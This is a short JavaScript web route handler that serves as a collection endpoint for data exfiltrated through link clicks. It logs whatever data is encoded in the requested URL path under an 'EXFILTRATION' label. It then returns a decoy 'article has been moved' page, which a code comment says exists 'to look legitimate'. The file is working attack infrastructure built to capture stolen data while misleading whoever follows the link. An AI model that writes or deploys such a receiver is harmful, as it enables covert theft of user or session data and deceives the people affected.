export default function handler(req, res) {
    const { slug } = req.query;
    
    if (slug && slug.length > 0) {
        const path = slug.join('/');
        console.log(`[EXFILTRATION VIA LINK CLICK] Path: ${path}`);
    }

    // Return a simple "article not found" page to look legitimate
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`<!DOCTYPE html>
<html><head><title>Article Moved</title></head>
<body style="font-family:sans-serif;max-width:600px;margin:2rem auto;padding:1rem;">
<h1>This article has been moved</h1>
<p>The resource you are looking for has been archived. Please visit our <a href="/">homepage</a> for updated content.</p>
</body></html>`);
}
